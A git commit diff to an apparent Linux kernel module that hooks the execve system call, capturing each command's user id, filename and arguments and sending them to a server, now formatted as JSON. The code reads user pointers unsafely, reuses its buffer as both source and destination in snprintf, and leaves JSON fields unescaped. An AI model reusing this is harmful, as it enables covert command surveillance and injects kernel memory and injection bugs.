fec0a8d6688dbabdbd92bf9b1ad722c4f17f51bd
Brett Broadhurst <brettbroadhurst@gmail.com>
2021-02-21 11:12:06 -0800

    Sending JSON instead

--- hooks/execve_hook.c
+++ hooks/execve_hook.c
@@ -13,13 +13,15 @@
 /* execve system call hook via ptregs. */
 asmlinkage int execve_hook(const struct pt_regs *regs)
 {
+    /* System call arguments */
     ptregs_syscall_hook_t sys_execve;
     char __user *filename = (char *)regs->di;
     char __user **argv = (char **)regs->si;
 
+    /* Hook arguments */
     char **p_argv = (char **)argv;
-    char *exec_str = NULL;
-    size_t exec_line_size;
+    char *json_buffer = NULL;
+    size_t json_buffer_size = DEFAULT_BUFFER_SIZE;
     kuid_t current_user_id = current_uid();
 
     /* Original system call */
@@ -30,57 +32,36 @@ asmlinkage int execve_hook(const struct pt_regs *regs)
         return sys_execve(regs);
     }
 
-    exec_line_size = 0;
-
-    /* Add the length of the uid string to the execve string. */
-    exec_line_size += (strlen("UID: 60000\n") + 1);
-
-    /* TEMP: Add the length of a temporary protocol header. */
-    exec_line_size += (strlen("Program: "));
-
-    /* TEMP: Add the length of a temporary protocol header. */
-    exec_line_size += (strlen("Command: "));
-
-    /* Add the length of the filename to the execve string. */
-    exec_line_size += (strlen(filename) + 1);
-
-    /* Add final newlines length. */
-    exec_line_size += 2;
-    
-    /* Calculate the size of the execve command string by checking all
-     * elements in argv[]. */
-    while (*p_argv != NULL) {
-        exec_line_size += (strlen(*p_argv) + 1);
-        (char **)p_argv++;
-    }
-
-    /* Allocate memory for the execve command string. */
-    exec_str = vmalloc(exec_line_size);
-    if (exec_str == NULL) {
+    /* Allocate memory for JSON buffer. */
+    json_buffer = vmalloc(json_buffer_size);
+    if (json_buffer == NULL) {
         printk(KERN_EMERG "watcher: could not allocate memory for execve string!\n");
         return sys_execve(regs); 
     }
 
-    memset(exec_str, 0, exec_line_size);
+    /* Clear the json buffer. */
+    memset(json_buffer, 0, json_buffer_size);
 
-    /* Copy user id to execve string. */
-    snprintf(exec_str, exec_line_size, "UID: %d\n", current_user_id.val);
+    /* Copy uid and filename to the json_buffer */
+    snprintf(json_buffer, json_buffer_size,
+            "{\"uid\":%d,\"filename\":\"%s\",\"command\":\"",
+            current_user_id.val, filename);
 
-    /* Copy filename to the execve string. */
-    snprintf(exec_str, exec_line_size, "%sProgram: %s\nCommand: ", exec_str, filename);
+    /* Copy all execve argv elements to the JSON buffer. */
     p_argv = (char **)argv;
-
-    /* Copy all execve argv elements to the execve string. */
     while (*p_argv != NULL) {
-        snprintf(exec_str, exec_line_size, "%s%s ", exec_str, *p_argv);
+        snprintf(json_buffer, json_buffer_size, "%s%s ", json_buffer, *p_argv);
         (char **)p_argv++;
     }
 
-    snprintf(exec_str, exec_line_size, "%s\n\n", exec_str);
-    server_send(exec_str, exec_line_size);
+    /* Close off the JSON buffer. */
+    snprintf(json_buffer, json_buffer_size, "%s\"}\n", json_buffer);
 
-    /* Free the memory. */
-    vfree(exec_str);
+    /* Send off the JSON buffer. */
+    server_send(json_buffer, json_buffer_size);
+
+    /* Free the JSON buffer. */
+    vfree(json_buffer);
     return sys_execve(regs); 
 }
 
